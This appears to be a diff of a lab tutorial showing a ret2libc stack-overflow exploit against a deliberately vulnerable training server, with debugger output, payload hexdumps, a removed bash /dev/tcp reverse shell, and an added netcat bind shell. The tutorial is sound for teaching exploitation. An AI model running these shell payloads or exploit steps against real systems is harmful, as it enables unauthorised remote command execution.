@@ -2,11 +2,9 @@
 
 ## Introduction
 
-We will create a functional exploit for a 64 bit program with a stack overflow vulnerability and enabled ASLR and DEP.
-This includes finding the vulnerability, get all necessary information for our exploit, and create a sample exploit as
-python program.
+We will create a functional remote exploit for a 64 bit server with a stack overflow vulnerability and enabled ASLR and DEP.
 
-We will use `system()` in LIBC by implementing the ret2plt / ret2libc exploit technique.
+We will be using ret2libc technique, to call `system()` in LIBC instead of shellcode directly, and using bash shellcode. 
 
 
 ## Source
@@ -16,409 +14,55 @@ We will use `system()` in LIBC by implementing the ret2plt / ret2libc exploit te
 
 You can compile it by calling `make` in the folder `~/challenges/challenge15`
 
-The source is identical to challenge13. A TCP/IP server with a buffer overflow.
+The source is basically identical to challenge13. A TCP/IP server with a buffer overflow. The difference is a function `notcalled()`
+and a `memcpy()` in `handleData()` to make the exercise easier
+to solve.
 
 
-## 
+### Vulnerability
 
-We have a server which is listening on port 5001. For each connection it will
-fork and execute the following code:
+The vulnerability lies here:
 
-```c
-int handleData(char *username, char *password) {
-        char firstname[256];
-
-        strcpy(firstname, username);
-
-        if (memcmp(username, "secret", 6) == 0) {
-                return 1;
-        } else {
-                return 0;
-        }
+```
+void handleData(char *username, char *password) {
+    char name[256];
+    ...
+    strcpy(name, username);
+    ...
 }
 
-void doprocessing (int sock) {
-        char username[1024];
-        char password[1024];
+void handleClient (int socket) {
+   char username[1024];
+   char password[1024];
 
-        printf("Client connected\n");
+   read(socket, username, 1023);
+   read(socket, password, 1023);
 
-        bzero(username, sizeof(username));
-        bzero(password, sizeof(password));
-
-        int n;
-
-        n = read(sock, username, 1023);
-        printf("Received username with len %i\n", n);
-
-        handleData(username, password);
+   int ret = handleData(username, password);
+   ...
 }
 ```
 
-The overflow is happening at the `strcpy()`.
+The vulnerability is identical to challenge13.
 
-## Start server
 
-We start the vulnerable server in the background, and attach it with GDB to the pid:
+### Usage
 
-```
-root@hlUbuntu64:~/challenges/challenge15# ./challenge15 &
-[1] 17147
-root@hlUbuntu64:~/challenges/challenge15# Listen on port: 5001
+The server expects two messages - similar to challenge12, but this time they
+are not read via stdin, but from a TCP/IP socket:
 
-root@hlUbuntu64:~/challenges/challenge15# echo $!
-17147
-root@hlUbuntu64:~/challenges/challenge15# gdb -q
-gdb-peda$ attach 17147
-[...]
-gdb-peda$ set follow-fork-mode child
-gdb-peda$
+```sh
+$ nc localhost 5001
+Username: test
+Password: test
+Not admin.
 ```
 
-Note that the server is paused right now, because we want to  issue another GDB
-command. But we could continue it with `c`.
-
-## Find offset
-
-As first step, we can create a peda pattern, which makes it easier for us to identify
-the offset to SIP. It should be bigger that the destination buffer (256 bytes in our case).
-```
-gdb-peda$ pattern create 300
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
-```
-
-We attached GDB to the server process, which paused the process. We also told GDB to follow children.
-Lets continue the process:
-```
-gdb-peda$ c
-Continuing.
-```
-
-The server is now unpaused. Lets send the peda pattern to the server:
-```
-root@hlUbuntu64:~/challenges/challenge15# echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%' | nc localhost 5001
-```
-
-We have the following output in GDB:
-
-```
-[----------------------------------registers-----------------------------------]
-RAX: 0x0
-RBX: 0x0
-RCX: 0x73 ('s')
-RDX: 0x6
-RSI: 0x400c9e --> 0x20746e65696c4300 ('')
-RDI: 0x7fffffffdff6 ("sAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A"...)
-RBP: 0x2541322541632541 ('A%cA%2A%')
-RSP: 0x7fffffffdbd8 ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n")
-RIP: 0x4009c2 (<handleData+92>: ret)
-R8 : 0x0
-R9 : 0x138
-R10: 0x37d
-R11: 0x7ffff7ba2730 --> 0xfffda400fffda12f
-R12: 0x400870 (<_start>:        xor    ebp,ebp)
-R13: 0x7fffffffe650 --> 0x1
-R14: 0x0
-R15: 0x0
-EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-  0x4009ba <handleData+84>:    jmp    0x4009c1 <handleData+91>
-  0x4009bc <handleData+86>:    mov    eax,0x0
-  0x4009c1 <handleData+91>:    leave
-=> 0x4009c2 <handleData+92>:    ret
-  0x4009c3 <doprocessing>:     push   rbp
-  0x4009c4 <doprocessing+1>:   mov    rbp,rsp
-  0x4009c7 <doprocessing+4>:   sub    rsp,0x820
-  0x4009ce <doprocessing+11>:  mov    DWORD PTR [rbp-0x814],edi
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffdbd8 ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n")
-0008| 0x7fffffffdbe0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n")
-0016| 0x7fffffffdbe8 ("A%JA%fA%5A%KA%gA%6A%\n")
-0024| 0x7fffffffdbf0 ("5A%KA%gA%6A%\n")
-0032| 0x7fffffffdbf8 --> 0xa25413625 ('%6A%\n')
-0040| 0x7fffffffdc00 --> 0x0
-0048| 0x7fffffffdc08 --> 0x0
-0056| 0x7fffffffdc10 --> 0x0
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x00000000004009c2 in handleData ()
-gdb-peda$
-```
-
-peda has the function `pattern_search`, which searches for the peda-pattern wherever it can:
-
-```
-gdb-peda$ pattern_search
-Registers contain pattern buffer:
-RBP+0 found at offset: 256
-Registers point to pattern buffer:
-[RDI] --> offset 6 - size ~203
-[RSP] --> offset 264 - size ~38
-Pattern buffer found at:
-0x0060301a : offset    0 - size  300 ([heap])
-0x00007fffffffd968 : offset  203 - size    4 ($sp + -0x270 [-156 dwords])
-[...]
-```
-
-It didnt not find the pattern in RIP, but RSP is pointing 264 bytes into the pattern.
-
-Lets try it again with a pattern of 264+4=268 bytes:
-
-```
-gdb-peda$ pattern create 268
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%d'
-gdb-peda$ attach 17147
-[...]
-gdb-peda$ c
-```
-
-Send the (now smaller) pattern to the server:
-```
-root@hlUbuntu64:~/challenges/challenge15# echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%d' | nc localhost 5001
-```
-
-And investigate it again:
-```
-gdb-peda$ pattern_search
-Registers contain pattern buffer:
-RBP+0 found at offset: 256
-RIP+0 found at offset: 264
-Registers point to pattern buffer:
-[RDI] --> offset 6 - size ~203
-Pattern buffer found at:
-0x0060301a : offset    0 - size  268 ([heap])
-[...]
-```
-
-Our assumption was correct. `RIP+0` is pointing 264 bytes into our generated pattern.
-Therefore the offset is 264 bytes.
-
-We can verify this. Lets print 264 times 'A', followed with 4 times "B".
-```
-root@hlUbuntu64:~/challenges/challenge15# perl -e 'print "A" x 264 . "BBBB"'
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBroot@hlUbuntu64:~/challenges/challenge15#
-root@hlUbuntu64:~/challenges/challenge15# perl -e 'print "A" x 264 . "BBBB"' | nc localhost 5001
-```
-
-Result:
-```
-Stopped reason: SIGSEGV
-0x0000000042424242 in ?? ()
-```
-
-As the letter B is hex 0x42, we see that we have the correct offset.
-
-## Address of system()
-
-We can just print the address of `system()` after the program started.
-Note that it has to begin with `0x40` (the code section is starting at `0x00400000`).
-```
-root@hlUbuntu64:~/challenges/challenge15# gdb -q ./challenge15
-gdb-peda$ print &system
-$1 = (<text variable, no debug info> *) 0x4007b0 <system@plt>
-```
-
-A wrong address:
-```
-gdb-peda$ print &system
-$1 = (<text variable, no debug info> *) 0x7ffff7a53380 <__libc_system>
-```
-
-Here we just print the address of system in the memory mapped LIBC-2.23.so:
-```
-gdb-peda$ vmmap
-Start              End                Perm      Name
-0x00400000         0x00401000         r-xp      /root/challenges/challenge15/challenge15
-0x00601000         0x00602000         r--p      /root/challenges/challenge15/challenge15
-0x00602000         0x00603000         rw-p      /root/challenges/challenge15/challenge15
-0x00603000         0x00624000         rw-p      [heap]
-0x00007ffff7a0e000 0x00007ffff7bce000 r-xp      /lib/x86_64-linux-gnu/libc-2.23.so
-0x00007ffff7bce000 0x00007ffff7dcd000 ---p      /lib/x86_64-linux-gnu/libc-2.23.so
-0x00007ffff7dcd000 0x00007ffff7dd1000 r--p      /lib/x86_64-linux-gnu/libc-2.23.so
-0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p      /lib/x86_64-linux-gnu/libc-2.23.so
-0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p      mapped
-0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp      /lib/x86_64-linux-gnu/ld-2.23.so
-0x00007ffff7fee000 0x00007ffff7ff1000 rw-p      mapped
-0x00007ffff7ff6000 0x00007ffff7ff8000 rw-p      mapped
-0x00007ffff7ff8000 0x00007ffff7ffa000 r--p      [vvar]
-0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
-0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /lib/x86_64-linux-gnu/ld-2.23.so
-0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /lib/x86_64-linux-gnu/ld-2.23.so
-0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
-0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
-0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
-```
-
-I also inserted a (useless) system() function in the main() function. We can deduct
-the address from the disassembly:
-
-```
-gdb-peda$ disas main
-Dump of assembler code for function main:
-   0x0000000000400a95 <+0>:     push   rbp
-   0x0000000000400a96 <+1>:     mov    rbp,rsp
-   0x0000000000400a99 <+4>:     sub    rsp,0x160
-   0x0000000000400aa0 <+11>:    mov    DWORD PTR [rbp-0x154],edi
-   0x0000000000400aa6 <+17>:    mov    QWORD PTR [rbp-0x160],rsi
-   0x0000000000400aad <+24>:    mov    edi,0x400d0f
-   0x0000000000400ab2 <+29>:    call   0x4007b0 <system@plt>
-[...]
-```
-
-As we can see, the call instruction has a hardcoded address 0x4007b0 with the symbol system@plt.
-
-
-
-
-## Shellcode
-
-`system()` executes binary. We just use bash, and use a special bash oneliner to create a
-connect-back shell:
-
-```
-shellcode = "0<&181-;exec 181<>/dev/tcp/127.0.0.1/1337;sh <&181 >&181 2>&181"
-shellcode =  'bash -c "' + shellcode + '" #'
-```
 
 ## Exploit
 
-Lets try the exploit:
-
-Start the server:
-```
-root@hlUbuntu64:~/challenges/challenge15# ./challenge15
-Listen on port: 5001
-```
-
-Start a listener:
-```
-root@hlUbuntu64:~/challenges/challenge15# nc -l -p 1337
-```
-
-And start the exploit:
-```
-root@hlUbuntu64:~/challenges/challenge15# ./challenge15-exp.py | nc localhost 5001
-```
-
-The server has some strange error messages:
-```
-Client connected
-Received username with len 267
-bash: redirection error: cannot duplicate fd: Bad file descriptor
-bash: 181: Bad file descriptor
-```
-
-But you can enter commands into the netcast listener:
-```
-root@hlUbuntu64:~/challenges/challenge15# nc -l -p 1337
-
-ls
-challenge15
-challenge15.c
-challenge15-exp.py
-Makefile
-peda-session-challenge15.txt
-id
-uid=0(root) gid=0(root) groups=0(root)
-^C
-root@hlUbuntu64:~/challenges/challenge15# nc -l -p 1337
-ls
-challenge15
-challenge15.c
-challenge15-exp.py
-Makefile
-peda-session-challenge15.txt
-```
-
-## Why does it work?
-
-Lets set a breakpoint before the `ret` of the vulnerable function:
-
-```
-gdb-peda$ disas handleData
-Dump of assembler code for function handleData:
-   0x00000000004009a6 <+0>:     push   rbp
-   0x00000000004009a7 <+1>:     mov    rbp,rsp
-   0x00000000004009aa <+4>:     sub    rsp,0x110
-   0x00000000004009b1 <+11>:    mov    QWORD PTR [rbp-0x108],rdi
-   0x00000000004009b8 <+18>:    mov    QWORD PTR [rbp-0x110],rsi
-   0x00000000004009bf <+25>:    mov    rdx,QWORD PTR [rbp-0x108]
-   0x00000000004009c6 <+32>:    lea    rax,[rbp-0x100]
-   0x00000000004009cd <+39>:    mov    rsi,rdx
-   0x00000000004009d0 <+42>:    mov    rdi,rax
-   0x00000000004009d3 <+45>:    call   0x400780 <strcpy@plt>
-   0x00000000004009d8 <+50>:    mov    rax,QWORD PTR [rbp-0x108]
-   0x00000000004009df <+57>:    mov    edx,0x6
-   0x00000000004009e4 <+62>:    mov    esi,0x400cd8
-   0x00000000004009e9 <+67>:    mov    rdi,rax
-   0x00000000004009ec <+70>:    call   0x400810 <memcmp@plt>
-   0x00000000004009f1 <+75>:    test   eax,eax
-   0x00000000004009f3 <+77>:    jne    0x4009fc <handleData+86>
-   0x00000000004009f5 <+79>:    mov    eax,0x1
-   0x00000000004009fa <+84>:    jmp    0x400a01 <handleData+91>
-   0x00000000004009fc <+86>:    mov    eax,0x0
-   0x0000000000400a01 <+91>:    leave
-   0x0000000000400a02 <+92>:    ret
-End of assembler dump.
-gdb-peda$ b *0x0000000000400a02
-Breakpoint 1 at 0x400a02
-gdb-peda$ c
-```
-
-Send an overly long string:
-```
-root@hlUbuntu64:~/challenges/challenge15# perl -e 'print "A" x 264 . "BBBB"' | nc localhost 5001
-```
-
-And check the output of gdb/peda:
-```
-[----------------------------------registers-----------------------------------]
-RAX: 0x0
-RBX: 0x0
-RCX: 0x73 ('s')
-RDX: 0x6
-RSI: 0x400cde --> 0x20746e65696c4300 ('')
-RDI: 0x7fffffffdff6 ('A' <repeats 200 times>...)
-RBP: 0x4141414141414141 ('AAAAAAAA')
-RSP: 0x7fffffffdbd8 --> 0x42424242 ('BBBB')
-RIP: 0x400a02 (<handleData+92>: ret)
-R8 : 0x0
-R9 : 0x1f
-R10: 0x37d
-R11: 0x7ffff7ba2730 --> 0xfffda400fffda12f
-R12: 0x4008b0 (<_start>:        xor    ebp,ebp)
-R13: 0x7fffffffe650 --> 0x1
-R14: 0x0
-R15: 0x0
-EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-  0x4009fa <handleData+84>:    jmp    0x400a01 <handleData+91>
-  0x4009fc <handleData+86>:    mov    eax,0x0
-  0x400a01 <handleData+91>:    leave
-=> 0x400a02 <handleData+92>:    ret
-  0x400a03 <doprocessing>:     push   rbp
-  0x400a04 <doprocessing+1>:   mov    rbp,rsp
-  0x400a07 <doprocessing+4>:   sub    rsp,0x820
-  0x400a0e <doprocessing+11>:  mov    DWORD PTR [rbp-0x814],edi
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffdbd8 --> 0x42424242 ('BBBB')
-0008| 0x7fffffffdbe0 --> 0x6e0000005d (']')
-0016| 0x7fffffffdbe8 --> 0x400000000
-0024| 0x7fffffffdbf0 --> 0x0
-0032| 0x7fffffffdbf8 --> 0x0
-0040| 0x7fffffffdc00 --> 0x0
-0048| 0x7fffffffdc08 --> 0x0
-0056| 0x7fffffffdc10 --> 0x0
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-
-Thread 2.1 "challenge15" hit Breakpoint 1, 0x0000000000400a02 in handleData ()
-```
-
-The next value on the stack is 0x42424242, which will be our new RIP.
-We will execute the syscall "system()". The call convention for syscalls defines that
-the first argument for the system is stored in `%rdi`. `system()` only uses one argument:
+Instead of pointing our SIP (return address) to the shellcode, we will
+instead point it to the addres of the function `system()` in LIBC: 
 
 ```
 NAME
@@ -428,30 +72,265 @@ SYNOPSIS
        #include <stdlib.h>
 
        int system(const char *command);
+
+DESCRIPTION
+       The  system() library function uses fork(2) to create a child process that executes
+       the shell command specified in command using execl(3) as follows:
+
+           execl("/bin/sh", "sh", "-c", command, (char *) NULL);
 ```
 
-So, we are in the process of executing `system()` - where does `%rdi` point to?
-We see it already above in the peda output, but lets check it again:
+
+So we need the address of `system()`. Lets start the program, 
+stop it at any location, and use the GEF command `got` to print the GOT:
 ```
-gdb-peda$ x/40g $rdi
-0x7fffffffdff6: 0x4141414141414141      0x4141414141414141
-0x7fffffffe006: 0x4141414141414141      0x4141414141414141
-0x7fffffffe016: 0x4141414141414141      0x4141414141414141
-0x7fffffffe026: 0x4141414141414141      0x4141414141414141
-0x7fffffffe036: 0x4141414141414141      0x4141414141414141
-0x7fffffffe046: 0x4141414141414141      0x4141414141414141
-0x7fffffffe056: 0x4141414141414141      0x4141414141414141
-0x7fffffffe066: 0x4141414141414141      0x4141414141414141
-0x7fffffffe076: 0x4141414141414141      0x4141414141414141
-0x7fffffffe086: 0x4141414141414141      0x4141414141414141
-0x7fffffffe096: 0x4141414141414141      0x4141414141414141
-0x7fffffffe0a6: 0x4141414141414141      0x4141414141414141
-0x7fffffffe0b6: 0x4141414141414141      0x4141414141414141
-0x7fffffffe0c6: 0x4141414141414141      0x4141414141414141
-0x7fffffffe0d6: 0x4141414141414141      0x4141414141414141
-0x7fffffffe0e6: 0x4141414141414141      0x4141414141414141
-0x7fffffffe0f6: 0x0000424242424141      0x0000000000000000
-0x7fffffffe106: 0x0000000000000000      0x0000000000000000
+~/challenges/challenge15$ python3 challenge15-solution.py --offset 280
+Dont forget to start the server in the background
+[+] Opening connection to localhost on port 5001: Done
+[*] running in new terminal: ['/usr/bin/gdb', '-q', '/root/challenges/challenge15/challenge15', '8859', '-x', '/tmp/pwn1xjvqp98.gdb']
+[+] Waiting for debugger: Done
+--[ Send pattern
+...
+
+─────────────────────────────────────────────────────────────────────────────────────────────
+$rbx   : 0x0
+$rcx   : 0xf000000000000000
+$rdx   : 0x3c
+$rsp   : 0x007ffde62e4610  →  0x007f8800000040 ("@"?)
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x0
+$rdi   : 0x007ffde62e4a20  →  "XXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$rip   : 0x42424242
+──────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+──────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "challenge15", stopped 0x42424242 in ?? (), reason: SIGSEGV
+─────────────────────────────────────────────────────────────────────────────────────────────
+
+gef➤  got
+
+GOT protection: Partial RelRO | GOT functions: 19
+
+[0x404018] strcpy@GLIBC_2.2.5  →  0x7f88c08d4580
+[0x404020] puts@GLIBC_2.2.5  →  0x7f88c08a85f0
+[0x404028] write@GLIBC_2.2.5  →  0x7f88c0920f20
+[0x404030] strlen@GLIBC_2.2.5  →  0x7f88c08cf820
+[0x404038] system@GLIBC_2.2.5  →  0x401076
+[0x404040] htons@GLIBC_2.2.5  →  0x7f88c093f740
+[0x404048] printf@GLIBC_2.2.5  →  0x7f88c0888cf0
+[0x404050] close@GLIBC_2.2.5  →  0x7f88c09216b0
+[0x404058] read@GLIBC_2.2.5  →  0x7f88c0920e80
+[0x404060] strcmp@GLIBC_2.2.5  →  0x7f88c08c6c30
+[0x404068] signal@GLIBC_2.2.5  →  0x7f88c086db60
+[0x404070] listen@GLIBC_2.2.5  →  0x7f88c0930fa0
+[0x404078] bind@GLIBC_2.2.5  →  0x7f88c0930e40
+[0x404080] perror@GLIBC_2.2.5  →  0x401106
+[0x404088] accept@GLIBC_2.2.5  →  0x7f88c0930da0
+[0x404090] exit@GLIBC_2.2.5  →  0x401126
+[0x404098] crypt@XCRYPT_2.0  →  0x7f88c0a0cae0
+[0x4040a0] fork@GLIBC_2.2.5  →  0x7f88c08fd470
+[0x4040a8] socket@GLIBC_2.2.5  →  0x7f88c0931470
+gef➤
 ```
 
-It accidently points exactly to our provided shellcode. How convenient!
+As we can see, the address of `system@GLIBC` is `0x401076`.
+
+We can investigate the memory region with the command `vmmap`:
+```
+gef➤  vmmap
+Start              End                Offset             Perm Path
+0x00000000400000 0x00000000401000 0x00000000000000 r-- /root/challenges/challenge15/challenge
+15
+0x00000000401000 0x00000000402000 0x00000000001000 r-x /root/challenges/challenge15/challenge
+15
+0x00000000402000 0x00000000403000 0x00000000002000 r-- /root/challenges/challenge15/challenge15
+0x00000000403000 0x00000000404000 0x00000000002000 r-- /root/challenges/challenge15/challenge15
+0x00000000404000 0x00000000405000 0x00000000003000 rw- /root/challenges/challenge15/challenge15
+...
+```
+
+I also inserted a system() function call in a function which never gets called. We can deduct the address of `system@plt` from the disassembly too:
+```
+gef➤  disas notcalled
+Dump of assembler code for function notcalled:
+   0x0000000000401242 <+0>:     push   rbp
+   0x0000000000401243 <+1>:     mov    rbp,rsp
+   0x0000000000401246 <+4>:     mov    edi,0x402008
+   0x000000000040124b <+9>:     call   0x401070 <system@plt>
+   0x0000000000401250 <+14>:    nop
+   0x0000000000401251 <+15>:    pop    rbp
+   0x0000000000401252 <+16>:    ret
+End of assembler dump.
+gef➤
+```
+
+`call   0x401070 <system@plt>` shows us the precise memory
+location.
+
+
+## Shellcode
+
+`system()` executes a bash command line. Lets keep it simple and use netcat as a listener bind shell:
+
+```
+nc.traditional -nlp 4444 127.0.0.1 -e /bin/bash #
+```
+
+Dont forget the trailing `#` to comment-out garbage from the stack.
+
+
+## Exploit
+
+Example of a successful exploit:
+```
+~/challenges/challenge15$ python3 challenge15-solution.py --offset 280 --address 0x401076 NOPTRACE
+Dont forget to start the server in the background
+[+] Opening connection to localhost on port 5001: Done
+[!] Skipping debug attach since context.noptrace==True
+--[ Send exploit
+00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000020  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000030  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000040  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000050  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000060  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000070  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000080  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+00000090  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+000000a0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+000000b0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+000000c0  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 6e  │    │    │    │   n│
+000000d0  63 2e 74 72  61 64 69 74  69 6f 6e 61  6c 20 2d 6e  │c.tr│adit│iona│l -n│
+000000e0  6c 70 20 34  34 34 34 20  31 32 37 2e  30 2e 30 2e  │lp 4│444 │127.│0.0.│
+000000f0  31 20 2d 65  20 2f 62 69  6e 2f 62 61  73 68 20 23  │1 -e│ /bi│n/ba│sh #│
+00000100  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000110  41 41 41 41  41 41 41 41  76 10 40 00  00 00 00 00  │AAAA│AAAA│v·@·│····│
+00000120
+[+] Opening connection to 127.0.0.1 on port 4444: Done
+[*] Switching to interactive mode
+$ ls
+Makefile
+challenge15
+challenge15-solution.py
+challenge15.c
+```
+
+
+## Analysis
+
+We just give the target the address of `system()` - but how does it know where our shellcode is? What's its argument?
+
+Remember, the function call convention is:
+```
+RDI, RSI, RDX, RCX, R8, R9
+```
+
+So we can check what's the contest of `RDI` before `ret`, 
+by setting a breakpoint before returning:
+
+```
+~/challenges/challenge15$ python3 challenge15-solution.py --offset 280 --gdb 'break *handleData+109'
+Dont forget to start the server in the background
+[+] Opening connection to localhost on port 5001: Done
+[*] running in new terminal: ['/usr/bin/gdb', '-q', '/root/challenges/challenge15/challenge15', '9688', '-x', '/tmp/pwnom_ajpnv.gdb']
+[+] Waiting for debugger: Done
+--[ Send pattern
+00000000  58 58 58 58  41 41 41 41  41 41 41 41  41 41 41 41  │XXXX│AAAA│AAAA│AAAA│
+00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000040  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000050  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000060  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000070  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000090  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000a0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000b0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000c0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000d0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000e0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+000000f0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000100  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+00000110  41 41 41 41  41 41 41 41  42 42 42 42               │AAAA│AAAA│BBBB│
+0000011c
+[▗] Receiving all data: 0B
+
+─────────────────────────────────────────────────────────────────────────────────────────────
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────── source:challenge15.c+43 ────
+     40     } else {
+     41        return 0;
+     42     }
+ →   43  }
+     44
+     45  void handleClient (int socket) {
+     46     char username[1024];
+────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x1
+$rbx   : 0x0
+$rcx   : 0xffffffff00000000
+$rdx   : 0xc
+$rsp   : 0x007ffef7b3e658  →  0x00000042424242 ("BBBB"?)
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0xf000
+$rdi   : 0x007ffef7b3ea70  →  "XXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$rip   : 0x0000000040130e  →  <handleData+109> ret
+──────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x40130d <handleData+108> leave
+ →   0x40130e <handleData+109> ret
+[!] Cannot disassemble from $PC
+──────────────────────────────────────────────────────────────────────────────── threads ────
